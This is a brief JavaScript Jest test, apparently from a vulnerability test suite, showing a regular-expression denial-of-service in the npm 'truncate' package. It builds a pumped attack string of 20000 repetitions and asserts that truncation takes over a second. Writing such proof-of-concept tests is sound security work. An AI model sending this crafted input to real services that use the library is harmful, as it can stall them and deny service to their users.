test("ReDos in truncate", () => {
  const genstr = require("../utils").genstr;
  const measureTime = require("../utils").measureTime;
  const truncate = require("truncate");
  let prefix = "-@w--w--";
  let pump = "ww--";
  let suffix = "";
  let nPumps = 20000;
  let attackString = prefix;
  for (var i = 0; i < nPumps; i++) {
    attackString += pump;
  }
  attackString += suffix;
  let input = "Hey " + attackString;
  let t = measureTime(function () {
    truncate(input, 4);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
